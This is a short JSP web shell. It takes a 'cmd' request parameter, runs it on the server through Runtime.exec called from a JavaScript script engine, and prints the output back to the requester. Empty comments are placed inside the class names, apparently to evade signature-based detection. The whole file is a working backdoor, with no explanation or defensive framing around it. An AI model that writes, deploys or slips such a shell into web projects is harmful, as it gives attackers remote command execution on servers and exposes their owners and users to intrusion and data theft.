<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="javax.script.ScriptEngine" %>
<%!
    public static InputStream exec(String cmd) throws Exception {
        InputStream inputStream = null;

        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("js");
        engine.eval("var runtime = java.lang./**/Runtime./**/getRuntime(); " +
                "var process = runtime.exec(\"" + cmd + "\"); " +
                "var inputStream = process.getInputStream(); ");
        // 获取对象
        inputStream = (InputStream) engine.eval("inputStream;");

        return inputStream;
    }

    public static String scanner(InputStream inputStream) {
        return new Scanner(inputStream).useDelimiter("\\A").next();
    }
%>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        out.println(scanner(exec(cmd)));
    }
%>